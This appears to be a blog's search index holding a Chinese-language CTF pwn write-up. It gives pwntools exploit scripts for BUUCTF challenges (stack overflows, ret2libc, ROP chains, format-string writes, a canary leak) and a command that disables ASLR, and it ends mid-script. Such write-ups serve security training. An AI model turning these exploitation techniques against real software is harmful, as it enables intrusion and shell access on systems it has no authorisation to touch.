<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>My New Post</title>
      <link href="/2024/08/25/My-New-Post/"/>
      <url>/2024/08/25/My-New-Post/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/08/24/WriteUp/"/>
      <url>/2024/08/24/WriteUp/</url>
      
        <content type="html"><![CDATA[<p>Attention:</p><ol><li><p>先看32位还是64位ELF文件（函数调用约定）</p></li><li><p>payload是32进制还是64进制 0x20 和 20 一个是 32 一个是20</p></li><li><p>exp context更新os和arch别搞错了</p></li><li><p>shellcraft.sh()生成的时候中间不要多加东西，系统不一样的话，生成的shellcode可能执行不了</p></li><li><p>16进制不加 0x 是吧</p></li><li><p>recv只接收不打印 recvline接收并且打印</p></li><li><p>sendline 会自动加上 回车符\n</p></li><li><p>32位程序main函数没有push ebp不要填充0x4</p></li><li><p>printf函数要给它合理的退出程序的地址如：exit</p></li><li><p>ret2libc 先got 再plt 再函数地址</p><p>如有错误恳请各位大佬指出，万分感谢！</p></li></ol><h1 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h1><h3 id="read函数"><a href="#read函数" class="headerlink" title="read函数"></a>read函数</h3><p><code>ssize_t read(int fd, void *buf, size_t count);</code></p><ul><li>**<code>fd</code>**：文件描述符，指明从哪个文件或设备读取数据。</li><li>**<code>buf</code>**：指向缓冲区的指针，这个缓冲区用于存储从文件描述符读取的数据。</li><li>**<code>count</code>**：要读取的最大字节数。</li></ul><p>返回值是实际读取的字节数；如果文件结束，则返回 0；如果发生错误，则返回 -1。</p><h3 id="write函数"><a href="#write函数" class="headerlink" title="write函数"></a>write函数</h3><p><code>ssize_t write(int fd, const void *buf, size_t count);</code></p><ul><li>**<code>fd</code>**：文件描述符，指明向哪个文件或设备写入数据。</li><li>**<code>buf</code>**：指向含有要写入数据的缓冲区的指针。</li><li>**<code>count</code>**：要写入的字节数。</li></ul><p>返回值是实际写入的字节数；如果发生错误，则返回 -1。</p><h3 id="puts函数"><a href="#puts函数" class="headerlink" title="puts函数"></a>puts函数</h3><p><code>int puts(const char *s);</code></p><p>返回值是一个非负整数，表示成功；如果发生错误，则返回 <code>EOF</code>。</p><p>关ASLR随机化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><h1 id="Buuctf"><a href="#Buuctf" class="headerlink" title="Buuctf"></a>Buuctf</h1><h3 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-3Ch] BYREF</span></span><br></pre></td></tr></table></figure><p>变量 <code>s</code> 存储在当前函数的栈帧中，相对于ESP的偏移量是 <code>0x1C</code>，相对于EBP的偏移量是 <code>-0x3C</code>。因此，<code>s</code> 在栈帧中的位置是在 <code>ebp-0x3C + 0x1C</code>。最多读取32（3C-1C）个字符</p><blockquote><p>fgets函数会检查输入的长度并限制输入的长度</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fgets(s, <span class="number">32</span>, edata);</span><br></pre></td></tr></table></figure><p>“I”和”you”互换</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replace((<span class="built_in">std</span>::<span class="built_in">string</span> *)v3);</span><br></pre></td></tr></table></figure><p>故payload &#x3D; 20个”I” + 4（32位ebp长度） + get_flag()函数地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27741</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*<span class="number">20</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p32(<span class="number">0x8048F0D</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"><span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br></pre></td></tr></table></figure><p>缓冲区大小为128字节，而<code>read</code>函数试图读取最多512字节的数据到这个缓冲区中，标准输入中的数据量超过了缓冲区的大小</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25782</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0x400596</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h3><p>格式化字符串漏洞：printf() 函数的参数被定义为可变的，printf() 函数从栈中取出参数，如果它需要 3 个，那它就取出 3 个。除非栈的边界被标记了，否则 printf() 是不会知道它取出的参数比提供给它的参数多了。</p><p>checksec 有 Canary 保护</p><p>输入探测格式化字符串的payload：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAA %<span class="number">08</span>x %<span class="number">08</span>x %<span class="number">08</span>x %<span class="number">08</span>x %<span class="number">08</span>x %<span class="number">08</span>x %<span class="number">08</span>x %<span class="number">08</span>x %<span class="number">08</span>x %<span class="number">08</span>x %<span class="number">08</span>x %<span class="number">08</span>x %<span class="number">08</span>x</span><br></pre></td></tr></table></figure><ul><li>“AAAA”：填充格式化字符串中的一部分，只用来填充位置</li><li>“%p”：这是一个格式化字符串占位符，以十六进制格式输出栈上的参数，并保证输出的宽度为8个字符</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25782</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = <span class="number">0x804C044</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;your name:&#x27;</span>)</span><br><span class="line">payload = p32(leak_addr) + <span class="string">b&#x27;%10$n&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;your passwd:&#x27;</span>) <span class="comment">#与shell进行交互</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>payload原理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(leak_addr) + <span class="string">b&#x27;%10$n&#x27;</span></span><br></pre></td></tr></table></figure><ul><li><code>%10: 这是一个格式化字符串占位符，用于将写入的字符数（即写入到先前提到的</code>p32(leak_addr)&#96;指向的地址的字符数）写入指定的地址。</li><li><code>$n</code>: 这是一个字段选择器，指定了参数的索引。在这个例子中，它表示在参数列表中选择第10个参数。</li></ul><p>因为0x804C044是4个字节，所以密码是4</p><h3 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h3><p>payload p32 第一个是call _system，第二个是 &#x2F;bin&#x2F;sh 的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29853</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p32(<span class="number">0x0804849E</span>) + p32(<span class="number">0x0804a024</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h3><p>ELF32</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29853</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">13</span>*<span class="number">4</span>) + p32(<span class="number">17</span>) + p32(<span class="number">0</span>)<span class="comment">#qword/栈对齐</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h3><p>在encrypt加密函数中的gets函数可以构造栈溢出，shift+f12找不到”system””&#x2F;bin&#x2F;sh”等字符串，需要利用ret2libc</p><p>libcsearcher枚举试库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">pr0cess = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28976</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_c_1&quot;</span>)</span><br><span class="line"></span><br><span class="line">plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">main = <span class="number">0x400b28</span></span><br><span class="line">ret_addr = <span class="number">0x4006b9</span></span><br><span class="line"></span><br><span class="line">pr0cess.recv()</span><br><span class="line">pr0cess.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">pr0cess.recvuntil(<span class="string">b&quot;encrypted\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(got)+p64(plt)+p64(main)</span><br><span class="line"></span><br><span class="line">pr0cess.sendline(payload)</span><br><span class="line"></span><br><span class="line">pr0cess.recvuntil(<span class="string">b&quot;Ciphertext\n&quot;</span>)</span><br><span class="line">pr0cess.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(pr0cess.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>, <span class="string">b&quot;\x00&quot;</span>)) <span class="comment">#puts函数地址</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">base_addr = puts_addr-libc.dump(<span class="string">&quot;puts&quot;</span>) <span class="comment">#程序基地址</span></span><br><span class="line"></span><br><span class="line">pr0cess.recv()</span><br><span class="line">pr0cess.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">pr0cess.recvuntil(<span class="string">b&quot;encrypted\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = base_addr+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = base_addr+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x58</span>+p64(ret_addr)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br><span class="line"></span><br><span class="line">pr0cess.sendline(payload)</span><br><span class="line"></span><br><span class="line">pr0cess.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26693</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./bjdctf_2020_babystack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x0000000000400561</span>  <span class="comment"># ROPgadget --binary ./bjdctf_2020_babystack --ropchain | grep &#x27;ret&#x27;</span></span><br><span class="line">func_bin_sh = <span class="number">0x00000000004006E6</span>  <span class="comment"># shiftf12</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400833</span>  <span class="comment"># ROPgadget --binary ./bjdctf_2020_babystack --ropchain | grep &#x27;rdi&#x27; | grep &#x27;ret&#x27;</span></span><br><span class="line">bin_sh = <span class="number">0x0000000000400858</span>  <span class="comment"># shiftf12</span></span><br><span class="line">system_addr = elf.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解法一：</span></span><br><span class="line"><span class="comment"># p.sendlineafter(b&quot;Please input the length of your name:&quot;, &quot;35&quot;) </span></span><br><span class="line"><span class="comment"># p.recv()</span></span><br><span class="line"><span class="comment"># payload = b&#x27;a&#x27; * 16 + b&quot;b&quot; * 8 + p64(ret) + p64(func_bin_sh)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解法二：</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Please input the length of your name:&quot;</span>, <span class="string">&quot;46&quot;</span>)  </span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">16</span> + <span class="string">b&quot;b&quot;</span> * <span class="number">8</span> + p64(pop_rdi_ret) + p64(bin_sh) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29935</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x600A90</span></span><br><span class="line">system = <span class="number">0x400603</span> <span class="comment"># 恰好是system函数</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4006b3</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x80</span>+<span class="number">8</span>) + p64(pop_rdi_ret) + p64(backdoor) + p64(system)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27206</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x0000000000601048</span></span><br><span class="line">system = <span class="number">0x00000000004005E3</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400683</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span>+<span class="number">8</span>) + p64(pop_rdi_ret) + p64(backdoor) + p64(system)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25449</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;bjdctf_2020_babyrop2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">gift = <span class="number">0x400814</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400993</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%7$p&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;I&#x27;ll give u some gift to help u!\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Pull up your sword and tell me u story!\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(canary) + <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(gift)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">base = puts_addr - <span class="number">0x6f6a0</span></span><br><span class="line">system = base + <span class="number">0x453a0</span></span><br><span class="line">bin_sh = base + <span class="number">0x18ce17</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Pull up your sword and tell me u story!\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(canary) + <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(pop_rdi) + p64(bin_sh) + p64(system) + p64(gift)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h3><p><strong>32位ELF文件，函数参数直接压入栈中</strong></p><p><strong>调用函数时栈的结构为：调用函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1-&gt; ··· -&gt;参数1</strong></p><p>调用者清理栈为外平栈，自身清理栈为内平栈，</p><p>main函数的gets溢出，调用get_flag(int a1, int a2)函数，函数的返回地址为exit，然后传入参数 a1 &#x3D;&#x3D; 0x308CD64F &amp;&amp; a2 &#x3D;&#x3D; 0x195719D1 ，这样会先赋值然后exit清栈防止栈上的异常（描述不是很严谨..</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="string">&quot;27276&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0X38</span>) + p32(<span class="number">0x080489A0</span>) + p32(<span class="number">0x0804E6A0</span>) + p32(<span class="number">0x308CD64F</span>) + p32(<span class="number">0x195719D1</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h3><p>nc</p><h3 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h3><p>strlen()函数遇到’\0’停止运行(‘\0’&#x3D;&#x3D;’\x00’)，就会执行下面的exit(0)</p><p>‘\xff’是用来覆盖v5的，详见IDA [ebp-2Ch] 到 [ebp-25h] 为 7 个字节，最后那个就用’\xff’覆盖，这样后面的read就能溢出了</p><p>主要逻辑：通过write获得libc地址，要接3个参数write(1,addr,len)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">context.log_level = <span 